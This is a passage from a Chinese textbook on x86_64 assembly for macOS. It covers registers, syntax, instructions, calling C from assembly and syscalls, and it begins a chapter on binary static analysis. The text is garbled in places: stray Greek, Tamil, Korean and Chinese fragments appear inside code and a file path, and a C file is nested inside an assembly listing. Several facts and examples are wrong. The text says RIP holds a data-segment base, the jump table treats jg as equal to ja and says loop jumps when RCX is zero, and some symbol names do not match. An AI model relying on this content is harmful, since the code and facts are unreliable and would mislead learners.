当CPU执行完一条指令之后，RIP会指向该指令的下一条指令，如果执行的是跳转指令或者函数调用指令等控制转移指令，则会将RIP设置为控制转移指令的目标地址。

RIP寄存器对应着32位汇编中的EIP寄存器，该寄存器在32位汇编代码中是无法使用的，但是在64位汇编中却可以使用，不过此时RIP寄存器的作用并不是指令指针寄存器，而是保存着数据段基地址。由于IA-32指令体系的限制，指令中的立即数长度是无法超过4字节的，因此在内存寻址中要访问完整的8字节的地址需要使用RIP寄存器作为基地址。

# 3. 标志寄存器

标志寄存器（RFLAGS）中存储着一组影响CPU行为的标志，或用于指示上一条指令的执行状态，其中常用的标志位及其作用可参考表5-3。

   </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>bit位</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CF</td><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>若算术操作产生的结果在最高有效位发生进位或借位则被置1，反之清零</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ZF</td><td style='text-align: center; word-wrap: break-word;'>6</td><td style='text-align: center; word-wrap: break-word;'>如果前一条指令的运算结果为0则被置1，反之清零</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SF</td><td style='text-align: center; word-wrap: break-word;'>7</td><td style='text-align: center; word-wrap: break-word;'>用于指示前一条指令的执行结果在最高有效位是否为1（即是否为负数）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>TF</td><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>当该位被置为1时启用单步调试模式，CPU每执行完一条指令就会触发一个单步异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DF</td><td style='text-align: center; word-wrap: break-word;'>10</td><td style='text-align: center; word-wrap: break-word;'>用于控制串指令（MOVS、LODS等）执行时地址为递增还是递减，为1时递减，为0则是递增</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OF</td><td style='text-align: center; word-wrap: break-word;'>11</td><td style='text-align: center; word-wrap: break-word;'>用于指示前一条指令的计算结果是否有溢出</td></tr></table>

RFLAGS寄存器中还有许多保留位，这些位中的数据目前没有意义，但是在新的标准中可能会使用。虽然Intel今后使用这些保留位作为新的标志位的概率很低，但是对于保留位，我们尽量不对其做任何处理，既不使用其保存数据，也不使用这些位中的数据。

# 4. 其他寄存器

x86_64架构中除了通用寄存器之外, 还有许多其他寄存器, 不过这些寄存器涉及的功能比较复杂, 这里就不一一讲解了。这些寄存器主要包括以下7种。

☐ 浮点寄存器：用于处理浮点数的一组寄存器。由于早期浮点数处理是有一个单独的协处理器×87进行处理的，所以浮点指令所使用的寄存器与普通指令的并不相同，而是使用单独的浮点寄存器。

☐ 段寄存器：用于存放段基地址的寄存器。本章中编写的代码都位于平坦模式下，所有的段都使用相同的基地址，所以在x86 64汇编中一般不需要用到段寄存器。

☐ MMX寄存器：MMX指令集可以使用的一组寄存器。

☐ SSE寄存器：SSE指令集可以使用的一组寄存器。

☐ AVX寄存器：AVX指令集可以使用的一组寄存器。

☐ 控制寄存器：与标志寄存器类似的一组寄存器，用于控制CPU运行行为。

☐ 调试寄存器：用于软件调试的一组寄存器。

#### 5.4.2 汇编语法

本节开始编写一些简单的汇编代码。首先将为大家介绍Intel语法与AT&T语法两种常用的汇编语法，然后介绍x86_64汇编中常用的一些指令。学习完本节之后，大家就可以使用汇编编写一些简单的程序了。

一个汇编源程序主要由伪指令和其他的汇编指令组成，在前面已经介绍了as汇编器支持的一些伪指令，接下来再来看一下x86_64中汇编指令的语法。x86_64汇编中主流的语法有两种，一种是Intel官方使用的Intel语法，这种语法是Intel提供的文档中所使用的语法，在Windows系统中使用也十分广泛，本书中的汇编代码也使用这种语法。

另一种比较常用的语法则是AT&T语法，这种语法是由AT&T公司的贝尔实验室设计的，据

说当初设计这种语法是为了实现跨指令集的汇编语法，不过很不幸他们的愿望并没有实现，反倒为汇编程序员带来了不少麻烦。AT&T语法在UNIX环境中使用非常广泛，因为最初的UNIX系统也是由贝尔实验室开发的。

在汇编源程序中，一条汇编指令占一行，格式如下：

label: prefix mnemonic operand #comment

一条指令可以分为5个部分，第一部分是这条指令的标签（label），标签对应着本条指令的地址。第二部分是指令的前缀，不同的指令可以有不同的前缀，Intel把所有的前缀分成4组，一条汇编指令可以有多个前缀，但是同一分组中的前缀只能有一个，也就是说一条指令可以有0~4个前缀。

助记符（mnemoinc）用来表示具体是哪一条指令，操作数（operand）则是这条汇编指令要操作的数据，它可以是一块内存，也可以是寄存器或立即数。根据汇编指令的不同，操作数的个数可以有0到3个，它们之间用逗号隔开，一般在有两个操作数的情况下，把第一个操作数称为目标操作数，第二个操作数则称为源操作数。最后以“#”开头的部分则是注释（comment）。

一条有效的汇编语句可能没有标签、前缀、操作数和注释，但是必须要有助记符。汇编中助记符和寄存器等一般不区分大小写，大家可以根据自己的喜好使用，不过最好不要大小写混用，否则容易造成阅读上的麻烦。下面我们看一条具体的汇编指令：

##### lab1: mov rax, 123 #将rax寄存器赋值为123

lab1是这条指令的标号，mov是指令助记符，也就是要执行的操作，rax和123是mov指令需要的两个操作数。一个操作数的类型有3种，可以是立即数、寄存器或内存，x86_64汇编不支持两个操作数都是内存操作数，目标操作数也不可以是立即数。mov_rax, 123中的rax操作数就是寄存器，而123则是立即数，这两种形式的操作数都是比较容易理解的，但是内存操作数比较复杂。

x86_64是复杂指令集，其中一个表现就是内存寻址方式很多，共有6种（这里忽略了段寄存器）。所谓的内存寻址，用通俗的语言来讲就是如何让指令知道要操作的内存的地址以及大小，而这6种方式本质上的差异就是如何计算这个内存地址。一个内存操作数具有如下格式：

##### size ptr [address]

size表示该操作数的大小，可以是byte（1字节）、word（2字节）、dword（4字节）或者qword（8字节），address则有如下6种表示方式。

(1) 立即寻址：address部分就是一个内存地址，比如说 byte ptr [0x123456] 操作数表示的就是内存地址  $ 0x123456 $ 位置一字节大小的内存。

(2) 寄存器间接寻址：address部分为一个寄存器，寄存器中保存着操作数的内存地址，例如 byte ptr [rax]。

(3) 寄存器相对寻址：在寄存器间接寻址的基础上加上一个立即数，即address部分由一个寄存器和一个偏移量相加或相减得到，例如byte ptr [rax + 0x100]。

   </div>

(4) 基址加变址寻址：与寄存器相对寻址类似，不过并不是加上一个立即数，而是加上另一个寄存器，例如byteptr[rax+rbx]，此外，变址部分可以是寄存器与2、4或8的乘积，例如byteptr[rax+rbx*8]。

(5)相对基址加变址寻址：在基址加变址寻址的基础上增加或减去一个偏移量，例如byteptr [rax + rbx * 8 - 0x1234]。

(6) 在x86_64中新增了一种基于RIP寄存器的RIP相对寻址，这种寻址方式就是address部分为RIP加上一个偏移量，例如byte ptr [rip + 0x1234]。

大部分汇编器对于内存操作数还支持一些比较灵活的格式，比如，如果内存操作数的大小可以确定，则可以不用写“sizeptr”，那么像mov rax, qword ptr [rbx]就可以简写成mov rax, [rbx]，不过在无法确定操作数大小的时候不可以省略，mov [rbx]，1这种写法是错误的，汇编器无法确定目标操作数的大小。

另外，address部分如果有偏移量，可以将偏移量写到方括号外，例如mov rax, qword ptr [rax + rbx * 8 + 0x1234]可以写成mov rax, qword ptr 0x1234[rax + rbx * 8]。由于操作数寻址比较强大，甚至有时可以用于整数运算，这就需要用到lea指令。lea指令用于计算第二个操作数的有效地址，并将它存储到第一个操作数中。

我们可以利用这个特性将要计算的数据当作地址进行计算，然后由lea指令将其存储到第一个操作数中。比如：

 $$ \text{lea rax, qword ptr [rax + rbx * 8 + 0x1234]} $$ 

这条指令会将 $ rax + rbx * 8 + 0x1234 $的结果存储到RAX寄存器中。如果直接使用运算指令来做这个运算的话，则需要3条指令才能完成这个操作。

前面提到，除了Intel汇编语法之外还有一种AT&T格式的汇编。在as汇编器中默认的汇编语法就是AT&T语法，实际上as汇编器对Intel语法支持得并不是特别完整，比如在Intel语法中单行注释应该是以分号“;”作为开始，而不是“#”；立即数中16进制格式是以“h”结尾，而不是C格式的“0x”开头等。

不过这对我们日常使用影响并不大，下面看一下AT&T格式的汇编与Intel汇编的差异。

□ AT&T语法中使用立即数时，需要在立即数前加$符号，比如Intel语法中的123，在AT&T语法中需要写成$123。

□ AT&T语法中使用寄存器时，需要在寄存器前加%符号，比如Intel语法中的rax，在AT&T语法中需要写成%rax。

□ AT&T语法中助记符之后需要增加一个单独的字符来表示操作数的大小，比如mov对应1、2、4、8字节的操作数时，需要写成movb、movw、movl和movq。

□ AT&T语法中源操作数和目标操作数与Intel语法的位置相反，比如说Intel中将RAX寄存器赋值为123的写法为mov eax，123，在AT&T语法中需要写成movq $123, %rax。

□ AT&T语法中内存操作数的格式也与Intel语法不同，比如说mov byte ptr [rax + rbx * 4 + 0x1234], 0x56对应的AT&T格式为movb $0x56, 0x1234(%rax, %rbx, 4), mov byte ptr [rax + rbx], 0x12对应的AT&T格式为movb $0x12, (%rax, %rbx), 相信大家能很容易看出来其中的对应关系。

#### 5.4.3 数据传送指令

数据传输指令用于将数据从一个操作数复制到另一个操作数，或将两个操作数中的数据进行交换。最常用的数据传输指令应该非mov莫属了，mov指令用于将源操作数复制到目标操作数中，虽然该指令名为移动（move），但实际上并不会清空源操作数，应该称之为复制指令。

源操作数可以是立即数、通用寄存器、段寄存器或内存位置；目标操作数可以是通用寄存器、段寄存器或内存位置，不过源操作数和目标操作数不能同时是内存位置，这是x86_64指令编码的限制。

如果需要交换两个操作数中的内容，则可以使用xchg指令。xchg指令也不支持两个操作数都是内存位置，不过如果某个操作数是内存位置，则xchg指令会对总线进行加锁操作，也就是说xchg指令总是能“原子”地交换两个操作数。

#### 5.4.4 控制转移指令

控制转移指令一般可以分为两种，一种是用于函数调用的函数调用和返回指令，一种是跳转到指定位置的跳转指令。

跳转指令会将RIP设置为操作数所指定的地址，即CPU会从操作数所指定的地址处继续执行。跳转指令也分有条件跳转和无条件跳转，无条件跳转指令jmp不执行任何判断，直接将RIP设置为操作数指定的地址，而其他跳转指令则会根据条件进行判断，符合条件的情况下才会设置RIP。有条件跳转的指令数量较多，指令与跳转条件的对应如表5-4所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>指令</td><td style='text-align: center; word-wrap: break-word;'>跳转条件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ja、jg、jnbe</td><td style='text-align: center; word-wrap: break-word;'>高于 $ CF=0 $且 $ ZF=0 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jae、jge、jnb、jnc</td><td style='text-align: center; word-wrap: break-word;'>高于或等于 $ CF=0 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jb、jc、jnae</td><td style='text-align: center; word-wrap: break-word;'>低于 $ CF=1 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jbe、jna</td><td style='text-align: center; word-wrap: break-word;'>低于或等于 $ CF=1 $或 $ ZF=1 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>je、jz</td><td style='text-align: center; word-wrap: break-word;'>等于 $ ZF=1 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jl、jge</td><td style='text-align: center; word-wrap: break-word;'>小于 $ SF \ll OF $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jle、jng</td><td style='text-align: center; word-wrap: break-word;'>小于或等于 $ ZF=1 $或 $ SF \ll OF $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jne、jnz</td><td style='text-align: center; word-wrap: break-word;'>不相等 $ ZF=0 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jno</td><td style='text-align: center; word-wrap: break-word;'>无溢出 $ OF=0 $时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jo</td><td style='text-align: center; word-wrap: break-word;'>溢出 $ OF=1 $时跳转</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>指令</td><td style='text-align: center; word-wrap: break-word;'>跳转条件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jnp、jpo</td><td style='text-align: center; word-wrap: break-word;'>奇校验 (PF=0) 时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jp</td><td style='text-align: center; word-wrap: break-word;'>偶校验 (PF=1) 时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jns</td><td style='text-align: center; word-wrap: break-word;'>正数 (SF=0) 时跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>loop</td><td style='text-align: center; word-wrap: break-word;'>将RCX寄存器减1，如果RCX为0则跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>loope、loopz</td><td style='text-align: center; word-wrap: break-word;'>将RCX寄存器减1，如果RCX为0且ZF=1则跳转</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>loopne、loopnz</td><td style='text-align: center; word-wrap: break-word;'>将RCX寄存器减1，如果RCX为0且ZF=0则跳转</td></tr></table>

跳转指令中有许多指令相同但是助记符不同的情况，比如说ja、jg、jnbe这3个助记符的机器码完全相同，只是为了方便使用，所以有多个助记符。

函数调用指令call和返回指令ret可以看成是变种的无条件跳转指令，call指令在效果上等同于将RIP寄存器压入堆栈，然后跳转到操作数指定的地址，而ret指令则是从栈中弹出一个值，并将这个值作为地址跳转过去。

#### 5.4.5 栈操作指令

一个程序运行时的内存一般可以简单地划分为代码区、静态数据区和动态数据区。代码区用于存放程序的代码，静态数据区则用于存放全局变量和静态变量等。动态数据区用于存放程序运行时动态申请的内存，这个区域分为两堆和栈个部分，在C语言中，使用malloc函数申请的内存都位于堆区，而使用的局部变量和函数的参数则位于栈上。

在堆区申请的内存，一般需要程序员自己手动释放，但是有的高级语言具有垃圾回收机制或引用计数，可以帮助程序员进行回收。这里的堆与数据结构中的堆并不是同一种东西，不过内存区域中的栈与数据结构中的栈却比较相似，在x86_64汇编中有专门的压栈和出栈指令用于操作栈，不过也可以将栈当作普通的内存进行操作。

在高级语言中，栈一般是由编译器进行管理的，并不需要程序员手动操作。不过在汇编中就没有这么幸运了，我们需要手工使用汇编指令操作栈，在调用函数时还需要遵守调用约定保持栈的平衡，接下来我们看一下几个常用的操作栈的指令，如表5-5所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>指令</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>push</td><td style='text-align: center; word-wrap: break-word;'>递减堆栈指针（RSP），然后将源操作数存储到栈顶</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pop</td><td style='text-align: center; word-wrap: break-word;'>将栈顶的值加载到目标操作数指定的位置，然后递增堆栈指针（RSP）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pushfq</td><td style='text-align: center; word-wrap: break-word;'>将堆栈指针递减8，并将RFLAGS寄存器的全部内容压入堆栈</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>popfq</td><td style='text-align: center; word-wrap: break-word;'>将栈顶的四字弹出，并将它的值存储到RFLAGS寄存器</td></tr></table>

在32位的x86汇编中还有pushad和popad指令用于一次性将所有通用寄存器压入、弹出栈，不过在64位汇编中已经不支持这两个指令了。

#### 5.4.6 运算指令

x86_64汇编直接支持不超过64位的整数的加减乘除运算，不过对于更大的数的运算，就需要自己实现或使用第三方库了。除了普通的四则运算，还有逻辑与、或、非等指令，如表5-6所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>运算指令</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>add</td><td style='text-align: center; word-wrap: break-word;'>加法指令，将第一个操作数与第二个操作数相加，并将结果存储到第一个操作数中。根据补码的特性，add指令不需要区分有符号或无符号操作数，但是会根据两种数据类型的计算结果设置OF与CF标志为1，以表示有符号或无符号结果的进位。SF标志表示有符号结果的符号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adc</td><td style='text-align: center; word-wrap: break-word;'>带进位加法，与add指令不同之处在于该指令会将CF标志位一并加上</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sub</td><td style='text-align: center; word-wrap: break-word;'>减法指令，使用第一个操作数减去第二个操作数，并将结果存储到目标操作数中。同样不区分操作数是否有符号，但是会根据两种数据类型的计算结果设置OF与CF标志设置为1，以表示有符号或无符号结果的借位。SF标志表示有符号结果的符号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sbb</td><td style='text-align: center; word-wrap: break-word;'>带借位减法，与sub指令不同之处在于该指令会将CF标志位一并减去</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mul</td><td style='text-align: center; word-wrap: break-word;'>无符号乘法指令，将操作数与隐含操作数进行无符号乘法操作，计算结果则分成两部分存储于两个寄存器中。当操作数大小为8/16/32/64位时，另一个乘数分别对应为AL/AX/EAX/RAX，结果则存储在AX/DX:AX/EDX:EAX/RDX:RAX中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>imul</td><td style='text-align: center; word-wrap: break-word;'>有符号乘法指令，该指令可以有一个、两个或三个操作数，当只有一个操作数时，操作数规则与mul相同；当有两个操作数时，则将第一个操作数与第二个操作数相乘，并将结果存储到第一个操作数中；如果有三个操作数，则将第二个操作数与第三个操作数相乘，并将结果存储到第一个操作数中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>div</td><td style='text-align: center; word-wrap: break-word;'>无符号除法指令，操作数为除数，当操作数大小为8/16/32/64位时，被除数对应为AX/DX:AX/EDX:EAX/RDX:RAX，商保存在AL/AX/EAX/RAX中，余数则保存在AH/DX/EDX/RDX中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>idiv</td><td style='text-align: center; word-wrap: break-word;'>有符号除法指令，操作数规则与div相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>XOR</td><td style='text-align: center; word-wrap: break-word;'>逻辑异或指令，将第一个操作数与第二个操作数执行逐位异或运算，并将结果存储到第一个操作数中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>or</td><td style='text-align: center; word-wrap: break-word;'>逻辑或指令，将第一个操作数与第二个操作数执行逐位或运算，并将结果存储到第一个操作数中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>and</td><td style='text-align: center; word-wrap: break-word;'>逻辑与指令，将第一个操作数与第二个操作数执行逐位与运算，并将结果存储到第一个操作数中</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>not</td><td style='text-align: center; word-wrap: break-word;'>逻辑非指令，对目标操作数执行逐位“非”操作并结果存储到目标操作数位置</td></tr></table>

### 5.5 与其他模块的交互

由于编程语言和编译器的不断发展，现在已经极少有只用汇编进行开发的项目了，并且由于操作系统提供的编程接口一般都是C语言接口，所以汇编代码与其他代码的交互也是非常重要的。只有了解了如何与高级语言进行交互，才能既发挥高级语言的优势，又可以在某些高级语言无法实现需要的功能时方便地调用汇编语言。

#### 5.5.1 与 C 语言互相调用

汇编语言要实现与C语言互相调用，一般都是从汇编中调用C语言的函数或者C语言调用汇编语言的函数。而进行函数调用则需要调用者和被调用者之间有一个统一的约定来传递参数和清理栈，这个约定被称为调用约定。

在32位环境中，调用约定比较多，有cdecl、stdcall、fastcall等。而在64位环境中调用约定则比较统一，虽然在不同的操作系统中有一些差异，不过这里我们只关心macOS系统。

在64位的类UNIX系统中，调用约定都遵守“System V AMD64 ABI reference”文档中所描述的调用约定，函数的前6个整型参数保存在RDI、RSI、RDX、RCX、R8和R9寄存器中。如果是浮点参数，则保存在XMM0到XMM7寄存器中。剩下的参数则压入栈中，函数需要通过栈指针获取这些参数。整型返回值保存在RAX寄存器中，浮点型返回值保存在XMM0中。

新建一个 “asm_invoke_c” 工程，测试一下如何在汇编中调用一个C的函数。将要调用的C函数名为foo，有10个uint64_t类型的参数，foo函数会将这10个参数使用printf函数依次打印出来，并将这10个参数的和作为返回值返回，C代码如下：

// print.c
#include <στάint.h>

uint64_t foo(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8, uint64_t a9, uint64_t a10)
{
    printf("a1=%lld, a2=%lld, a3=%lld, a4=%lld, a5=%lld, a6=%lld, a7=%lld, a8=%ல்ல, a9=%ல்ல, a10=%ல்ல\n",
    a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
    return a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10;
}

调用该函数的汇编代码：

// main.s
.text
.intel_syntax noprefix
.globl    main
.align    4, 0x90
_main:
    push    rbp
    mov    rbp, rsp
    push 10
    push 9
    push 8
    push 7
    mov r9d, 6
    mov r8d, 5
    mov ecx, 4
    mov edx, 3
    mov esi, 2
    mov edi, 1
    call    foo
    add rsp, 32
    pop rbp
    ret

编译并运行该代码会产生如下输出：

a1=1, a2=2, a3=3, a4=4, a5=5, a6=6, a7=7, a8=8, a9=9, a10=10
Program ended with exit code: 55

前6个参数使用寄存器传递，这里只用32位寄存器是应为x86_64的机制，将edi赋值为1，实际上也就是将rdi赋值为1，但是如果使用mov rdi，1，由于需要rex prefix将会导致生成的机器码长度变长，所以这里使用了32位的寄存器，剩下的a7-a10参数则是放到堆栈上进行传递。

根据C函数命名的规定，在C代码中定义的函数在汇编中使用时需要在函数名前加一个下划线，所以这里调用的是_foo。调用完毕后由调用者负责将栈回复平衡，在调用函数时向栈上压入了4个8字节的参数，所以这里使用add_rsp，32来修改栈指针。

有的编译器生成的汇编代码超过6个的参数部分并不是使用push方式将参数压入栈，而是直接使用sub指令操作栈指针，然后使用mov指令将参数放入栈中，这两种方式传递参数的效果是相同的。返回值保存在rax寄存器中，然后rax寄存器又被当作main函数的返回值返回给了操作系统，所以会输出“Program ended with exit code: 55”。

理解了如何从汇编代码中调用C的函数，那从C代码中调用汇编函数也就不难写出了，下面的代码在汇编代码中实现一个foo函数，这个函数有10个qword类型的参数，并将这10个参数相加作为返回值返回：

// foo.s
.section __TEXT, __text, regular, pure_instructions
.macosx_version_min 10, 12
.intel_syntax noprefix
.glob1 foo
.align 4, 0x90
_foo:
    push rbp
    mov rbp, rsp
    lea rax, [rdi + rsi]
    add rax, rdx
    add rax, rcx
    add rax, r8
    add rax, r9
    add rax, qword ptr [rbp + 16]
    add rax, qword ptr [rbp + 24]
    add rax, qword ptr [rbp + 32]
    add rax, qword ptr [rbp + 40]
    pop rbp
    ret
    // main.c
    #include <stdio.h>
    #include <stdio.h>
    uint64_t foo(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8, uint64_t a9, uint64_t a10);
    int main(int argc, const char * argv[])
    {
        printf("result is %lld\\n", foo(1,2,3,4,5,6,7,8,9,10));
        return 0;
    }
}

如果参数或者返回值的宽度不是64位的，在使用的时候需要使用相应宽度的寄存器。不过放到栈上的参数仍然是64位的，在使用的时候需要自己取出对应宽度的值。

#### 5.5.2 使用系统调用

在现代操作系统中，为了保护系统内核不会轻易地被其他代码所破坏，处理器需要对代码进行权限分级，低权限的代码将不能执行某些特权指令，不能访问高权限代码的地址空间。现代操作系统内核一般都运行在高权限模式（内核模式）下，而普通应用程序的代码则运行在低权限（用户模式）下，这样可以有效防止普通应用程序中的恶意代码或错误代码对操作系统的内核造成破坏。

不过，当普通权限的代码在需要使用内核提供的功能时，需要通过一种上下文切换方式切换到内核模式中。在x86_64处理器中提供了Ring0-Ring3这4个权限级别，而macOS系统只使用了其中两个权限级别，系统内核运行在Ring0级别，用户态代码则运行在Ring3，从用户态切换到内核态需要使用syscall指令（在32位系统上使用的是sysenter指令），从内核态返回到用户态则需要使用sysexit指令。

macOS系统调用的约定也遵循“System V AMD64 ABI reference”文档中所描述的系统调用约定，与普通函数的调用约定十分相似，系统调用的前6个参数存放在RDI、RSI、RDX、RCX、R8和R9寄存器中，超过6个的部分则放到栈中，返回值存放于RAX寄存器中。

不过系统调用需要一个调用号，每一个调用号对应一个系统调用，系统调用号与系统调用之间的对应关系可以参考XNU源代码中的BSD/kern/字数的文档。下面是该文件的一部分：

0 AUE_NULL ALL { int nosys(void); } { indirect药业}
1 AUE_EXIT ALL { void exit(int rval) NO_SYSTEM_STUB; }
2 AUE_FORK ALL { int fork(void) NO_SYSTEM_STUB; }
3 AUE_NULL ALL { user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4 AUE_NULL ALL { user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5 AUE_OPEN_RWTC ALL { int open(user_addr_t path, int flags, int mode) NO_SYSTEM_STUB; }
6 AUE_CLOSE ALL { int close(int fd); }
7 AUE_WAIT4 ALL { int wait4(int pid, user_addr_t status, int options, user_addr_t rusage) }
NO_SYSTEM_STUB; }
8 AUE_NULL ALL { int enosys(void); } { old creat }
9 AUE_LINK ALL { int link(user_addr_t path, user_addr_t link); }
10 AUE_UNLINK ALL { int unlink(user_addr_t path) NO_SYSTEM_STUB; }
11 AUE_NULL ALL { int enosys(void); } { old execv }
12 AUE_CHDIR ALL { int chdir(user_addr_t path); }
13 AUE_FCHDIR ALL { int fchdir(int fd); }
14 AUE_MKNOD ALL { int mknod(user_addr_t path, int mode, int dev); }
15 AUE_CHMOD ALL { int chmod(user_addr_t path, int mode) NO_SYSTEM_STUB; }
16 AUE_CHOWN ALL { int chown(user_addr_t path, int uid, int gid); }
17 AUE_NULL ALL { int enosys(void); } { old break }
18 AUE_GETFSSTAT ALL { int getfsstat(user_addr_t buf, int bufsize, int flags); }
19 AUE_NULL ALL { int enosys(void); } { old lseek }
20 AUE_GETPID ALL { int getpid(void); }
21 AUE_NULL ALL { int enosys(void); } { old mount }
22 AUE_NULL ALL { int enosys(void); } { old umount }

23 AUE_SETUID ALL { int setuid(uid_t uid); }
24 AUE_GETUID ALL { int getuid(void); }
25 AUE_GETEUID ALL { int geteuid(void); }
26 AUE_PTRACE ALL { int prtrace(int req, pid_t pid, caddr_t addr, int data); }

由于这个文件会被脚本编译成C语言代码，所以其中会有一些对我们来说无用的数据，不过还是很容易看出第一列就是系统调用号，后面则是这个系统调用的C语言格式的函数声明。不过这里的系统调用号需要加上0x2000000才是真正的系统调用号。

接下来我们使用系统调用写一个在控制台中输出“Hello World”的程序，看一下具体如何使用系统调用。

// hello_syscall.s
.text
.intel_syntax noprefix
.globl_main
_main:
    mov edi, 1
    lea rsi, [rip + str]
    mov rdx, 12
    mov rax, 0x2000004
    syscall
    xor eax, eax
    ret
.cstring
str:
    ascii "Hello World\\n"

编译并运行这段代码，将会在控制台上打印出“Hello World”，这里的系统调用号是4，根据터넷에서調整，可以找到对应的是write系统调用：

user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte);

该系统调用用于向一个文件描述符中写入内容，第一个参数是文件描述符，当该参数为1时表示写到控制台上进行显示，后两个参数则分别是要写入的内容和内容的长度。

### 5.6 本章小结

本章概要地介绍了macOS上进行汇编开发所需要的各个知识点，相信通过本章的学习大家已经能够使用汇编开发一些简单的程序了。不过x86_64汇编十分复杂，要想熟练掌握，还需要多加练习和使用。除此之外，大家也可以多将一些C的代码使用编译器编译成汇编代码，或者使用反汇编工具进行反汇编，对照着C代码进行学习，这也是一种比较有效的学习汇编语言的方法。

至于x86_64的指令，我们没有必要全部记住，在需要的时候通过查询指令手册来学习也不失为一种有效的方法。

# 软件静态分析

软件静态分析分为软件生成前期的代码静态分析（Code Static Analysis，也称为代码分析）与软件生成后的二进制静态分析（Binary Static Analysis，也称为二进制分析）。代码分析多用于软件开发阶段的故障排除与性能调优，属于软件开发范畴。二进制分析即软件的静态逆向分析，是本章将要讨论的内容。

### 6.1 代码分析与二进制分析

代码静态分析针对的目标是程序代码，通过人工或工具化的形式，对代码进行静态分析，检查程序的语法、结构、过程、接口的正确性，找出代码隐藏的错误和缺陷，如参数不匹配、嵌套语句有歧义、递归错误、非法计算、可能出现的空指针引用等。人工静态分析代码的成本较高，目前不同的程序语言都有相对成熟的商业化静态分析工具，比如Facebook公司发布的针对Java、C与Objective-C语言的开源静态分析工具infer $ ^{①} $，该工具可以很好地发现软件开发期间的编码问题。另外，除了外部的静态分析工具clang-analyzer，目前很多现代化的编译器也提供了代码静态分析功能，比如macOS上Xcode集成开发环境中提供的Clang编译器。Xcode自3.2版本起，就集成了代码静态分析工具，可以通过点击Xcode菜单的Product→Analyze进行静态分析。分析完成后，如果有错误或警告，Xcode会在错误信息面板中详细输出。Xcode中的静态功能依赖于Clang，除了直接从Xcode启动外，还可以以单独命令行的形式运行scan-build。可以访问http://clang-analyzer.llvm.org，获取更详细的Clang静态分析工具的信息。

代码静态分析的另一个需求是代码流程分析。对于代码开发人员来说，流程分析可以判断代码在编译执行后是否与预期的执行流程相匹配；对于第三方的代码分析人员来说，可以快速了解代码的运行流程，掌握软件的整体架构思想。典型的流程分析有Clang编译代码流程分析，按照操作流程通常分为代码插桩、执行、分析3个阶段。首先需要编写用于程序分析的pass，然后编译生成目标代码并运行，最后才是静态分析。这部分内容不在本书讨论范围内，此处不再展开。

二进制静态分析与软件生成前期的代码静态分析最大的不同是在进行分析时通常没有程序

的源代码，分析的目标主体是程序的二进制文件，通过使用静态分析工具（或称为反汇编分析工具）来辅助分析人员进行全自动化或半自动化的分析。二进制静态分析也能像代码分析一样，既能查找程序的错误与缺陷，也能分析程序的执行流程，但由于没有源代码的辅助，分析的时间成本更高，工作难度更大。

### 6.2 分析工具

